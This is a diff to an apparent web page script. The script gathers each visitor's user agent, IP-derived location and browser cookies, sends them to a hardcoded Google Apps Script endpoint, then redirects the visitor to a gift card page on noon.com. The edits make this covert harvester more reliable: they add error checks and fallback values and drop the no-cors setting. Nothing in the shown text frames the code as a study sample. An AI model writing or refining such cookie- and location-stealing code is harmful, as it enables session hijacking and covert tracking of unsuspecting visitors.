@@ -27,12 +27,22 @@
         // Get Device Info
         let userAgent = navigator.userAgent;
 
-        // Get IP-based Location using ip-api.com (using HTTPS)
+        // Get IP-based Location using ip-api.com
         fetch('https://ip-api.com/json')
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok: ' + response.statusText);
+                }
+                return response.json();
+            })
             .then(data => {
+                // Check if the data is valid
+                if (data.status === 'fail') {
+                    throw new Error('Failed to fetch location data: ' + data.message);
+                }
+
                 let ipAddress = data.query;
-                let location = `City: ${data.city}, Region: ${data.regionName}, Country: ${data.country}`;
+                let location = `City: ${data.city || 'unknown'}, Region: ${data.regionName || 'unknown'}, Country: ${data.country || 'unknown'}`;
 
                 // Get Cookies
                 let cookies = document.cookie || "No cookies available";
@@ -45,10 +55,9 @@
                     cookies: cookies
                 };
 
-                // Send data to Google Apps Script Web App with no-cors mode
+                // Send data to Google Apps Script Web App
                 fetch('https://script.google.com/macros/s/AKfycbw-ZyPqRTxpno-zSBjilrYACHAW4piIc03hC3lT0cfBzLjggztQNRnmJwln26TrOipPow/exec', {
                     method: 'POST',
-                    mode: 'no-cors',  // This prevents CORS issues, but we can't check the response
                     headers: {
                         'Content-Type': 'application/json'
                     },
@@ -60,7 +69,7 @@
                     // Redirect the user immediately after data is sent
                     window.location.href = "https://www.noon.com/uae-en/electronics-and-mobiles/gift-card/";
                 })
-                .catch((error) => console.error('Error:', error));
+                .catch((error) => console.error('Error sending data:', error));
             })
             .catch(err => console.error('Error fetching IP-based location:', err));
     </script>
